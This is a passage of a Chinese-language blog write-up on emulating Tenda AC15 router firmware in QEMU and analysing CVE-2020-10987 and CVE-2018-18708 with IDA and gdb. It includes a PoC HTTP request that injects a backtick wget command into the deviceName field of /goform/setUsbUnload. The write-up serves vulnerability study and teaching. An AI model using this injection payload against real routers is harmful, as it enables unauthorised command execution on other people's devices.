inet_ntoa(v8); <span class="hljs-comment">// 将IP地址结构体转换为点分十进制字符串形式</span><br>    <span class="hljs-built_in">strcpy</span>(a2, v3); <span class="hljs-comment">// 将转换后的IP地址字符串拷贝到a2参数指向的缓冲区</span><br>    close(fd); <span class="hljs-comment">// 关闭套接字</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回成功</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    close(fd); <span class="hljs-comment">// 关闭套接字</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 返回失败</span><br>  &#125;<br>&#125;<br><br>ioctl 调用:<br>使用 ioctl(fd, <span class="hljs-number">0x8915</span>u, dest) 发起系统调用，目的是获取指定网络接口的IP地址。<br>如果 ioctl 返回值大于等于<span class="hljs-number">0</span>，表示获取IP地址成功。<br></code></pre></td></tr></table></figure><p>libcommon.so中查找getLanIfName()函数，可以看到get_eth_name 和getLanIfName存在调用关系</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802165257453.png" alt="image-20240802165257453"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802165346810.png" alt="image-20240802165346810"></p><p>这里可以看出传入参数为0</p><p>grep -r 搜索get_eth_name</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802022643185.png" alt="image-20240802022643185"></p><p>这里定位到了libChipApi.so库，放到ida里搜索该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *__fastcall <span class="hljs-title function_">get_eth_name</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v1; <span class="hljs-comment">// r3</span><br><br>  <span class="hljs-keyword">switch</span> ( a1 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      v1 = <span class="hljs-string">&quot;br0&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      v1 = <span class="hljs-string">&quot;br1&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>      v1 = <span class="hljs-string">&quot;vlan1&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:<br>      v1 = <span class="hljs-string">&quot;vlan2&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:<br>      v1 = <span class="hljs-string">&quot;vlan3&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br>      v1 = <span class="hljs-string">&quot;vlan4&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:<br>      v1 = <span class="hljs-string">&quot;vlan5&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">23</span>:<br>      v1 = <span class="hljs-string">&quot;eth1&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">24</span>:<br>      v1 = <span class="hljs-string">&quot;wl0.1&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">27</span>:<br>      v1 = <span class="hljs-string">&quot;eth2&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">28</span>:<br>      v1 = <span class="hljs-string">&quot;wl1.1&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">51</span>:<br>      v1 = <span class="hljs-string">&quot;br10&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">55</span>:<br>      v1 = <span class="hljs-string">&quot;br20&quot;</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      v1 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;unk_66C8;<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>前面传入的参数是0 ，所以要设置br0网卡，否则服务是无法访问的！！！！！！</strong></p><p>自己画了个流程图方便大家理解</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802170418371.png" alt="image-20240802170418371"></p><p>设置网卡br0：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo brctl addbr br0<br><br>sudo ifconfig br0 192.168.0.3<br></code></pre></td></tr></table></figure><p>成功启动web</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802023749886.png" alt="image-20240802023749886"></p><h4 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统级模拟是 QEMU 的完整虚拟化模式，它可以模拟整个硬件平台和操作系统环境，使得在虚拟机中能够运行完整的操作系统。<br></code></pre></td></tr></table></figure><p>宿主机启动虚拟机脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-arm \<br>    -M vexpress-a9 \<br>    -kernel /home/iot/tools/qemu-images/armhf/vmlinuz-3.2.0-4-vexpress \<br>    -initrd /home/iot/tools/qemu-images/armhf/initrd.img-3.2.0-4-vexpress \<br>    -drive if=sd,file=/home/iot/tools/qemu-images/armhf/debian_wheezy_armhf_standard.qcow2 \<br>    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \<br>    -net nic -net tap,ifname=tap0,script=no,downscript=no \<br>    -nographic<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">-M vexpress-a9 \<br><br>指定虚拟机的机器类型为 vexpress-a9，这是一个 ARM 开发板模型。<br>-kernel /home/iot/tools/qemu-images/armhf/vmlinuz-3.2.0-4-vexpress \<br><br>指定虚拟机使用的内核镜像文件的路径和文件名。<br>-initrd /home/iot/tools/qemu-images/armhf/initrd.img-3.2.0-4-vexpress \<br><br>指定虚拟机使用的 initrd（初始化 RAM 磁盘）镜像文件的路径和文件名。<br>-drive if=sd,file=/home/iot/tools/qemu-images/armhf/debian_wheezy_armhf_standard.qcow2 \<br><br>定义一个虚拟硬盘驱动器，使用 qcow2 格式的镜像文件作为虚拟机的根文件系统。<br>-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \<br><br>向内核传递的启动参数，指定根文件系统的位置和控制台设备。<br>-net nic -net tap,ifname=tap0,script=no,downscript=no \<br><br>配置虚拟网络接口：<br>-net nic：创建一个虚拟网络接口卡。<br>-net tap,ifname=tap0,script=no,downscript=no：连接到 tap0 设备，禁用启动和关闭脚本。<br>-nographic<br>使用非图形化的控制台模式启动虚拟机，所有的输入输出都将通过控制台进行。<br></code></pre></td></tr></table></figure><p>虚拟机配置网卡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">ip link add br0 type dummy<br>ip: 这是 Linux 系统中用于配置网络接口的命令行工具。<br>link: 表示进行网络接口相关的操作。<br>add: 指示要添加一个新的网络接口。<br>br0: 是要创建的虚拟网络接口的名称。在这里，br0 是一个常见的命名约定，通常用于桥接接口的命名。<br>type dummy: 指定创建的接口类型为 dummy。dummy 接口是一种虚拟的、无实际数据传输功能的接口，它的主要用途是占位符或者协议测试。<br>ifconfig eth0 192.168.0.2/24<br>ifconfig br0 192.168.0.3/24<br></code></pre></td></tr></table></figure><p>虚拟机挂载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount --bind /proc/ proc/<br>mount --bind /sys/ sys/<br>mount --bind /dev/ dev/<br></code></pre></td></tr></table></figure><p>tar命令压缩、scp传送压缩包、解压…  </p><p>这里压缩打包时注意要打包<strong>patch过后的httpd</strong></p><p>得到文件结构</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802031009196.png" alt="image-20240802031009196"></p><p>设置根目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chroot . sh<br>/bin/httpd<br></code></pre></td></tr></table></figure><p>直接启动了</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802040247258.png" alt="image-20240802040247258"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="CVE-2020-10987"><a href="#CVE-2020-10987" class="headerlink" title="CVE-2020-10987"></a>CVE-2020-10987</h4><p>在formestUsbUnload函数里，可以直接在deviceName后打入命令，传到doSystemCmd去执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">formsetUsbUnload</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// [sp+14h] [bp-10h]</span><br><br>  <span class="hljs-comment">// 调用 sub_2BA8C 函数，获取设备名称，存储在 v3 变量中</span><br>  v3 = sub_2BA8C(a1, <span class="hljs-string">&quot;deviceName&quot;</span>, (<span class="hljs-type">int</span>)&amp;unk_F1F54);<br><br>  <span class="hljs-comment">// 执行系统命令，通过 cfm post netctrl 接口发送请求</span><br>  doSystemCmd(<span class="hljs-string">&quot;cfm post netctrl %d?op=%d,string_info=%s&quot;</span>, <span class="hljs-number">51</span>, <span class="hljs-number">3</span>, v3);<br><br>  <span class="hljs-comment">// 调用 sub_2C40C 函数，发送 HTTP 响应头 &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br>  sub_2C40C(a1, <span class="hljs-string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>);<br><br>  <span class="hljs-comment">// 继续调用 sub_2C40C 函数，发送 JSON 格式的响应体 &quot;&#123;\&quot;errCode\&quot;:0&#125;&quot;</span><br>  sub_2C40C(a1, <span class="hljs-string">&quot;&#123;\&quot;errCode\&quot;:0&#125;&quot;</span>);<br><br>  <span class="hljs-comment">// 调用 sub_2C954 函数，返回 200 给调用者</span><br>  <span class="hljs-keyword">return</span> sub_2C954((_DWORD *)a1, <span class="hljs-number">200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>检查交叉引用和文件系统发现对应的路径为goform&#x2F;setUsbUnload</p><p>抓包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/goform/setUsbUnload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.3<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/plain, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>20<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.0.3<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.0.3/status_usb.html<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>password=huzcvb<br><br><span class="language-abnf"></span><br><span class="language-abnf"><span class="hljs-attribute">deviceName</span><span class="hljs-operator">=</span>undefined</span><br></code></pre></td></tr></table></figure><p>漏洞点deviceName</p><p>那么挖这个洞的人一开始是怎么找到这个漏洞的呢</p><p>httpd中有很多doSystemCmd函数的调用，这个函数是一个EXTERNAL函数</p><p>在libcommon.so中找到该函数，可以看到此处接收参数并执行了system函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802115505823.png" alt="image-20240802115505823"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802115443133.png" alt="image-20240802115443133"></p><p>ida中查看httpd中doSystemCmd</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802115738250.png" alt="image-20240802115738250"></p><p>这里可以一个一个看，排除掉用户不可控的引用位置，并最终分析到formsetUsbUnload函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802120028263.png" alt="image-20240802120028263"></p><p>或者想省力一点可以用IDA插件VulFi，他可以快速定位危险函数并帮助用户排除不可控的点，并且可以自定义规则查找</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802120628301.png" alt="image-20240802120628301"></p><p>向上查看formsetUsbUnload的引用</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802143905454.png" alt="image-20240802143905454"></p><p>定位到setUsbUnload字符串，grep -r 搜索文件目录，查到了status_usb.html</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802144016408.png" alt="image-20240802144016408"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802144125645.png" alt="image-20240802144125645"></p><p>poc</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/goform/setUsbUnload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.3<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/plain, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>41<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.0.3<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.0.3/status_usb.html<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>password=huzcvb<br><br><span class="language-ebnf"><span class="hljs-attribute">deviceName</span>=<span class="hljs-string">`wget http://192.168.0.1:8000`</span></span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802041359087.png" alt="image-20240802041359087"></p><p>在漏洞点的动态调试</p><p>ps查看httpd进程号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./gdbserver :8866 --attach 2409<br></code></pre></td></tr></table></figure><p>gdb-multiarch .&#x2F;bin&#x2F;httpd -X script</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">set arch arm<br>set endian little<br>set sysroot lib/<br>set solib-search-path lib/<br>b formsetUsbUnload<br>target remote 192.168.0.3:8866<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802042117283.png" alt="image-20240802042117283"></p><p>burp 发包</p><p>看到了deviceName参数的传参流程</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802150907259.png" alt="image-20240802150907259"></p><p>deviceName存入栈中，开始拼接系统命令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802151038759.png" alt="image-20240802151038759"></p><p>调用doSystemCmd函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802151135490.png" alt="image-20240802151135490"></p><p>开始打印返回参数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802151423303.png" alt="image-20240802151423303"></p><h4 id="CVE-2018-18708"><a href="#CVE-2018-18708" class="headerlink" title="CVE-2018-18708"></a>CVE-2018-18708</h4><p>已知vul fuction在httpd中的sub_C24C0函数中</p><p>同样这里VulFi插件也已经帮我们扫到了</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/br0%E7%9A%84%E7%88%B1%E6%81%A8%E6%83%85%E4%BB%87/image-20240802152051141.png" alt="image-20240802152051141"></p><h5 id="分析调用链"><a href="#分析调用链" class="headerlink" title="分析调用链"></a>分析调用链</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_C24C0</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1, <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v6[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [sp+10h] [bp-34h] BYREF</span><br>  <span class="hljs-type">int</span> s2[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [sp+20h] [bp-24h] BYREF</span><br>  <span class="hljs-type">char</span> v8; <span class="hljs-comment">// [sp+32h] [bp-12h]</span><br>  <span class="hljs-type">char</span> v9; <span class="hljs-comment">// [sp+33h] [bp-11h]</span><br>  <span class="hljs-type">char</span> *src; <span class="hljs-comment">// [sp+34h] [bp-10h]</span><br><br>  <span class="hljs-comment">// 查找字符串 a1 中第一个 &#x27;\r&#x27; 的位置</span><br>  src = <span class="hljs-built_in">strchr</span>(a1, <span class="hljs-number">13</span>);<br>  <br>  <span class="hljs-comment">// 如果找到了 &#x27;\r&#x27;</span><br>  <span class="hljs-keyword">if</span> ( src )<br>  &#123;<br>    <span class="hljs-comment">// 将找到的 &#x27;\r&#x27; 替换为字符串结束符 &#x27;\0&#x27;</span><br>    *src++ = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 清空 v6 数组</span><br>    <span class="hljs-built_in">memset</span>(v6, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v6));<br>    <br>    <span class="hljs-comment">// 调用 GetValue 函数，将返回值存入 v6 数组中，查询键为 &quot;cgi_debug&quot;</span><br>    <span class="hljs-comment">// 如果查询成功，并且返回值为 &quot;on&quot;</span><br>    <span class="hljs-keyword">if</span> ( GetValue((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;cgi_debug&quot;</span>, (<span class="hljs-type">int</span>)v6) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)v6) )<br>    &#123;<br>      v9 = <span class="hljs-number">1</span>; <span class="hljs-comment">// 设置 v9 为 1</span><br>      <br>      <span class="hljs-comment">// 打印调试信息</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_1018C8[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;parse_macfilter_rule&quot;</span>, <span class="hljs-number">807</span>, off_1018C0[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parase rule: name == %s, mac == %s\n\x1B[0m&quot;</span>, a1, src);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 将 a1 的内容拷贝到 a2 + 32 的位置</span><br>    <span class="hljs-built_in">strcpy</span>(a2 + <span class="hljs-number">32</span>, a1);<br>    <br>    <span class="hljs-comment">// 将 src 的内容（即找到的 &#x27;\r&#x27; 后的部分）拷贝到 a2 的位置</span><br>    <span class="hljs-built_in">strcpy</span>(a2, src);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回 0 表示成功</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-comment">// 如果未找到 &#x27;\r&#x27;</span><br>    <br>    <span class="hljs-comment">// 清空 s2 数组</span><br>    <span class="hljs-built_in">memset</span>(s2, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s2));<br>    <br>    <span class="hljs-comment">// 调用 GetValue 函数，将返回值存入 s2 数组中，查询键为 &quot;cgi_debug&quot;</span><br>    <span class="hljs-comment">// 如果查询成功，并且返回值为 &quot;on&quot;</span><br>    <span class="hljs-keyword">if</span> ( GetValue((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;cgi_debug&quot;</span>, (<span class="hljs-type">int</span>)s2) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;on&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)s2) )<br>    &#123;<br>      v8 = <span class="hljs-number">2</span>; <span class="hljs-comment">// 设置 v8 为 2</span><br>      <br>      <span class="hljs-comment">// 打印调试信息</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[%s:%s:%d] %s&quot;</span>, off_1018C8[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cgi&quot;</span>, <span class="hljs-string">&quot;parse_macfilter_rule&quot;</span>, <span class="hljs-number">803</span>, off_1018C4[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;source_rule error: %s!\n\x1B[0m&quot;</span>, a1);<br>    &#125;<br>    <br>    <span 